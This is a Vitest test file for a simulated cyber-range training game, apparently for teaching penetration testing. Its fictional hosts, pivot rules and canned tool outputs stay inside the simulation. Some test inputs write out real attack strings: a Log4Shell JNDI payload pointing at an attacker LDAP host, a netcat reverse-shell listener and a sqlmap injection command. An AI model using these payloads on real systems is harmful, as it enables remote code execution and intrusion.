import { describe, it, expect, beforeEach } from 'vitest';
import { SimulationEngine } from '../simulation/simulationEngine';
import { SimulatedCommandAdapters } from '../simulation/adapters/commandAdapters';
import { CommandInterpreter, CommandContext } from '../services/commandInterpreter';
import { VirtualFileSystem } from '../services/virtualFs';
import { INITIAL_MACHINES } from '../store/gameStore';

describe('Phase 3: Deterministic Cyber Range Simulation Engine', () => {
  let engine: SimulationEngine;

  beforeEach(() => {
    engine = SimulationEngine.getInstance();
    engine.resetRange();
  });

  describe('1. Machine Definitions & Network Subnets', () => {
    it('initializes predefined machines with realistic network interfaces and ports', () => {
      const machines = engine.getMachines();
      expect(machines).toHaveLength(3);

      const ecorp = engine.getMachine('ecorp-hr');
      expect(ecorp).toBeDefined();
      expect(ecorp?.ip).toBe('10.10.11.45');
      expect(ecorp?.os).toBe('Linux');
      expect(ecorp?.ports.map((p) => p.port)).toEqual([22, 80, 8080]);
      expect(ecorp?.interfaces[0].ip).toBe('10.10.11.45');

      const iron = engine.getMachine('iron-vault');
      expect(iron?.ip).toBe('10.10.11.82');
      expect(iron?.ports.map((p) => p.port)).toEqual([22, 8080, 3306]);

      const dc01 = engine.getMachine('corp-dc01');
      expect(dc01?.ip).toBe('10.10.11.99');
      expect(dc01?.ports.map((p) => p.port)).toEqual([53, 88, 389, 445]);
    });

    it('enforces network routing and pivoting boundaries', () => {
      // DMZ is directly reachable from attacker
      const dmzCheck = engine.canReachIp('10.10.11.45');
      expect(dmzCheck.reachable).toBe(true);

      // Internal Services Subnet (IronBank 10.10.11.82) is isolated and requires ecorp-hr pivot
      const ironIsolatedCheck = engine.canReachIp('10.10.11.82');
      expect(ironIsolatedCheck.reachable).toBe(false);
      expect(ironIsolatedCheck.reason).toContain('Requires an initial foothold on pivot host \'ecorp-hr\'');

      // Once ecorp-hr is compromised to USER, IronBank becomes reachable through the pivot
      engine.setMachineCompromiseLevel('ecorp-hr', 'USER');
      const ironPivotedCheck = engine.canReachIp('10.10.11.82');
      expect(ironPivotedCheck.reachable).toBe(true);

      // AD Forest requires iron-vault compromise
      const adIsolatedCheck = engine.canReachIp('10.10.11.99');
      expect(adIsolatedCheck.reachable).toBe(false);

      engine.setMachineCompromiseLevel('iron-vault', 'USER');
      const adPivotedCheck = engine.canReachIp('10.10.11.99');
      expect(adPivotedCheck.reachable).toBe(true);
    });
  });

  describe('2. Service Discovery & Web Route Registry', () => {
    it('discovers ports and emits SERVICE_DISCOVERED events', () => {
      let eventFired = false;
      const unsubscribe = engine.subscribe((evt) => {
        if (evt.type === 'SERVICE_DISCOVERED' && evt.machineId === 'ecorp-hr') {
          eventFired = true;
        }
      });

      const discovered = engine.discoverPort('ecorp-hr', 80);
      expect(discovered).toBe(true);
      expect(engine.getDiscoveredPorts('ecorp-hr')).toContain(80);
      expect(eventFired).toBe(true);

      // Repeated discovery does not duplicate
      const duplicateDiscovery = engine.discoverPort('ecorp-hr', 80);
      expect(duplicateDiscovery).toBe(false);

      unsubscribe();
    });

    it('handles simulated HTTP web requests and discovers routes', () => {
      const res = engine.handleHttpRequest('10.10.11.45', {
        method: 'GET',
        path: '/portal',
        headers: {},
      });

      expect(res.statusCode).toBe(200);
      expect(res.body).toContain('Staff Directory');
      expect(res.contentType).toContain('text/html');

      // 404 for unknown route
      const notFound = engine.handleHttpRequest('10.10.11.45', {
        method: 'GET',
        path: '/non_existent_page',
        headers: {},
      });
      expect(notFound.statusCode).toBe(404);
    });

    it('handles dynamic HTTP handlers with JNDI Log4j payload execution', () => {
      const auditRes = engine.handleHttpRequest('10.10.11.45', {
        method: 'POST',
        path: '/api/audit',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ auditLog: '${jndi:ldap://10.10.14.22:1389/Exploit}' }),
      });

      expect(auditRes.statusCode).toBe(200);
      const parsed = JSON.parse(auditRes.body);
      expect(parsed.status).toBe('exploit_triggered');
      expect(engine.getMachineCompromiseLevel('ecorp-hr')).toBe('USER');
    });
  });

  describe('3. Challenge Objectives & Prerequisite Enforcement', () => {
    it('enforces objective prerequisites and prevents skipping steps', () => {
      // Objective 2 (Web Directory Enumeration) requires Objective 1 (Network Reconnaissance)
      const prematureAttempt = engine.completeObjective('ecorp-hr', 'ecorp-obj-2');
      expect(prematureAttempt.success).toBe(false);
      expect(prematureAttempt.error).toContain('Prerequisite objectives must be completed first');

      // Complete Objective 1
      const obj1Res = engine.completeObjective('ecorp-hr', 'ecorp-obj-1');
      expect(obj1Res.success).toBe(true);
      expect(obj1Res.event?.type).toBe('CHALLENGE_COMPLETED');
      expect(obj1Res.event?.xpAwarded).toBe(10);

      // Now Objective 2 can be completed
      const obj2Res = engine.completeObjective('ecorp-hr', 'ecorp-obj-2');
      expect(obj2Res.success).toBe(true);

      // Duplicate completion fails with meaningful explanation
      const dupAttempt = engine.completeObjective('ecorp-hr', 'ecorp-obj-2');
      expect(dupAttempt.success).toBe(false);
      expect(dupAttempt.error).toContain('already completed');
    });
  });

  describe('4. Evidence & Inventory Records', () => {
    it('records discovered evidence and ignores duplicates', () => {
      const item = engine.addEvidence({
        machineId: 'ecorp-hr',
        type: 'CREDENTIAL',
        name: 'SSH Private Key',
        source: '/home/alex/.ssh/id_rsa',
        value: '-----BEGIN OPENSSH PRIVATE KEY-----...',
        description: 'Discovered in Alex home directory',
      });

      expect(item.id).toBeDefined();
      expect(engine.getEvidence()).toHaveLength(1);

      // Duplicate addition returns existing item without adding a duplicate
      const duplicate = engine.addEvidence({
        machineId: 'ecorp-hr',
        type: 'CREDENTIAL',
        name: 'SSH Private Key Duplicate',
        source: '/home/alex/.ssh/id_rsa',
        value: '-----BEGIN OPENSSH PRIVATE KEY-----...',
        description: 'Duplicate',
      });

      expect(duplicate.id).toBe(item.id);
      expect(engine.getEvidence()).toHaveLength(1);
    });
  });

  describe('5. Virtual Sessions & Process Tables', () => {
    it('creates, tracks, and terminates active sessions', () => {
      const session = engine.createSession('ecorp-hr', 'SSH', 'alex', '/home/alex');
      expect(session.id).toBeDefined();
      expect(session.user).toBe('alex');
      expect(engine.getActiveSessions()).toHaveLength(1);

      const term = engine.terminateSession(session.id);
      expect(term).toBe(true);
      expect(engine.getActiveSessions()).toHaveLength(0);
    });

    it('queries virtual process table for running daemons', () => {
      const procs = engine.getProcesses('ecorp-hr');
      expect(procs.length).toBeGreaterThan(0);
      const commands = procs.map((p) => p.command);
      expect(commands.some((c) => c.includes('sshd'))).toBe(true);
      expect(commands.some((c) => c.includes('apache2'))).toBe(true);
      expect(commands.some((c) => c.includes('java'))).toBe(true);
    });
  });

  describe('6. Reset Subsystem & Versioned Serialization', () => {
    it('resets a single machine state back to initial state', () => {
      engine.discoverPort('ecorp-hr', 80);
      engine.setMachineCompromiseLevel('ecorp-hr', 'ROOT');
      engine.createSession('ecorp-hr', 'SSH', 'root', '/root');

      expect(engine.getMachineCompromiseLevel('ecorp-hr')).toBe('ROOT');
      expect(engine.getActiveSessions()).toHaveLength(1);

      const resetOk = engine.resetMachine('ecorp-hr');
      expect(resetOk).toBe(true);
      expect(engine.getMachineCompromiseLevel('ecorp-hr')).toBe('NONE');
      expect(engine.getDiscoveredPorts('ecorp-hr')).toHaveLength(0);
      expect(engine.getActiveSessions()).toHaveLength(0);
    });

    it('exports and imports versioned save state deterministically', () => {
      engine.discoverPort('ecorp-hr', 22);
      engine.discoverPort('ecorp-hr', 80);
      engine.setMachineCompromiseLevel('ecorp-hr', 'USER');

      const savedState = engine.exportState();
      expect(savedState.version).toBe(1);
      expect(savedState.machines.find((m) => m.id === 'ecorp-hr')?.compromiseLevel).toBe('USER');

      // Reset range
      engine.resetRange();
      expect(engine.getMachineCompromiseLevel('ecorp-hr')).toBe('NONE');

      // Import state back
      const importOk = engine.importState(savedState);
      expect(importOk).toBe(true);
      expect(engine.getMachineCompromiseLevel('ecorp-hr')).toBe('USER');
      expect(engine.getDiscoveredPorts('ecorp-hr')).toContain(22);
      expect(engine.getDiscoveredPorts('ecorp-hr')).toContain(80);
    });

    it('rejects incompatible serialized state versions', () => {
      const invalid = { version: 99, timestamp: 0, score: 0, evidence: [], events: [], activeSessions: [], discoveredSubnets: [], machines: [] };
      const importOk = engine.importState(invalid as any);
      expect(importOk).toBe(false);
    });
  });

  describe('7. Deterministic Simulated Command Adapters', () => {
    const getContext = (): CommandContext => ({
      user: 'kali',
      hostname: 'pwnbox',
      cwd: '/home/kali',
      fs: new VirtualFileSystem(),
      activeTarget: INITIAL_MACHINES[0],
      history: [],
      inReverseShell: false,
    });

    it('executes nmap against reachable host and reports ports', () => {
      const ctx = getContext();
      const res = CommandInterpreter.execute('nmap -sV -sC 10.10.11.45', ctx);
      expect(res.exitCode).toBe(0);
      expect(res.output).toContain('Nmap scan report for E-Corp HR Portal');
      expect(res.output).toContain('22/tcp');
      expect(res.output).toContain('80/tcp');
      expect(res.output).toContain('8080/tcp');
      expect(res.targetCompromised).toBe('RECON');
    });

    it('nmap fails deterministically against unreachable isolated host', () => {
      const ctx = getContext();
      const res = CommandInterpreter.execute('nmap 10.10.11.82', ctx);
      expect(res.output).toContain('Requires an initial foothold on pivot host');
    });

    it('executes gobuster directory fuzzing', () => {
      const res = SimulatedCommandAdapters.gobuster(['dir', '-u', 'http://10.10.11.45', '-w', 'common.txt']);
      expect(res.exitCode).toBe(0);
      expect(res.stdout).toContain('/portal');
      expect(res.stdout).toContain('/login');
      expect(res.stdout).toContain('/api/audit');
    });

    it('executes curl and triggers JNDI Log4Shell attack', () => {
      const res = SimulatedCommandAdapters.curl(['-X', 'POST', '-H', 'Content-Type: application/json', '-d', '{"payload":"${jndi:ldap://10.10.14.22:1389/Exploit}"}', 'http://10.10.11.45/api/audit']);
      expect(res.exitCode).toBe(0);
      expect(res.stdout).toContain('exploit_triggered');
      expect(res.soundTrigger).toBe('connect');
    });

    it('executes netcat reverse shell catch and updates compromise to USER', () => {
      const res = SimulatedCommandAdapters.nc(['-lvnp', '4444']);
      expect(res.exitCode).toBe(0);
      expect(res.enterShell?.user).toBe('www-data');
      expect(res.enterShell?.host).toBe('ecorp-hr');
      expect(res.targetCompromised).toBe('USER');
    });

    it('executes ssh login with alex credentials', () => {
      const ctx: any = { user: 'kali', hostname: 'pwnbox', cwd: '/home/kali', fs: new VirtualFileSystem(), activeTarget: INITIAL_MACHINES[0] };
      const res = SimulatedCommandAdapters.ssh(['alex@10.10.11.45'], ctx);
      expect(res.exitCode).toBe(0);
      expect(res.enterShell?.user).toBe('alex');
      expect(res.enterShell?.host).toBe('ecorp-hr');
    });

    it('executes sqlmap against vulnerable login endpoint and extracts admin JWT', () => {
      // First pivot to IronBank
      engine.setMachineCompromiseLevel('ecorp-hr', 'USER');

      const res = SimulatedCommandAdapters.sqlmap(['-u', 'http://10.10.11.82:8080/api/login', '--data', 'username=admin&password=x']);
      expect(res.exitCode).toBe(0);
      expect(res.stdout).toContain('POST parameter \'username\' is vulnerable');
      expect(res.stdout).toContain('ironbank_db');

      const evidence = engine.getEvidence();
      expect(evidence.some((e) => e.name.includes('Admin JWT'))).toBe(true);
    });

    it('executes linpeas.sh and highlights sudo find GTFOBins vulnerability', () => {
      const ctx: any = { user: 'alex', hostname: 'ecorp-hr', cwd: '/home/alex' };
      const res = SimulatedCommandAdapters.linpeas(ctx);
      expect(res.exitCode).toBe(0);
      expect(res.stdout).toContain('Linux Privilege Escalation Awesome Script');
      expect(res.stdout).toContain('NOPASSWD: /usr/bin/find');
      expect(res.stdout).toContain('gtfobins.github.io');
    });

    it('executes ps aux and reports running daemons', () => {
      const ctx = getContext();
      const res = CommandInterpreter.execute('ps aux', ctx);
      expect(res.exitCode).toBe(0);
      expect(res.output).toContain('USER       PID %CPU %MEM');
      expect(res.output).toContain('/sbin/init');
    });

    it('verifies determinism: identical initial state and command sequence produces identical state', () => {
      const runSequence = () => {
        engine.resetRange();
        const ctx = getContext();

        // Step 1: Scan
        CommandInterpreter.execute('nmap -sV 10.10.11.45', ctx);
        // Step 2: Fuzz
        CommandInterpreter.execute('gobuster dir -u http://10.10.11.45 -w common.txt', ctx);
        // Step 3: Trigger Log4j
        CommandInterpreter.execute('curl -X POST -d \'${jndi:ldap://10.10.14.22/Exploit}\' http://10.10.11.45/api/audit', ctx);
        // Step 4: Catch Shell
        CommandInterpreter.execute('nc -lvnp 4444', ctx);

        return {
          compromiseLevel: engine.getMachineCompromiseLevel('ecorp-hr'),
          ports: engine.getDiscoveredPorts('ecorp-hr'),
          eventsCount: engine.exportState().events.length,
          score: engine.getScore(),
        };
      };

      const result1 = runSequence();
      const result2 = runSequence();

      expect(result1).toEqual(result2);
      expect(result1.compromiseLevel).toBe('USER');
      expect(result1.ports).toEqual([22, 80, 8080]);
    });
  });
});
